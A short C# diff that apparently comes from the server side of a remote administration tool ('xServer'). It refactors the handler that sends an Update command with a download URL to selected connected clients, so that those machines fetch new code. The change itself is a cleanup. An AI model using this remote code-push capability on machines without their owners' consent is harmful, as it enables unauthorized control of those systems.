@@ -275,13 +275,15 @@ namespace xServer.Forms
             {
                 if (lstClients.SelectedItems.Count != 0)
                 {
-                    FrmUpdate frmU = new FrmUpdate(lstClients.SelectedItems.Count);
-                    if (frmU.ShowDialog() == DialogResult.OK)
+                    using (var frm = new FrmUpdate(lstClients.SelectedItems.Count))
                     {
-                        foreach (ListViewItem lvi in lstClients.SelectedItems)
+                        if (frm.ShowDialog() == DialogResult.OK)
                         {
-                            Client c = (Client)lvi.Tag;
-                            new Core.Packets.ServerPackets.Update(Core.Misc.Update.DownloadURL).Execute(c);
+                            foreach (ListViewItem lvi in lstClients.SelectedItems)
+                            {
+                                Client c = (Client) lvi.Tag;
+                                new Core.Packets.ServerPackets.Update(Core.Misc.Update.DownloadURL).Execute(c);
+                            }
                         }
                     }
                 }
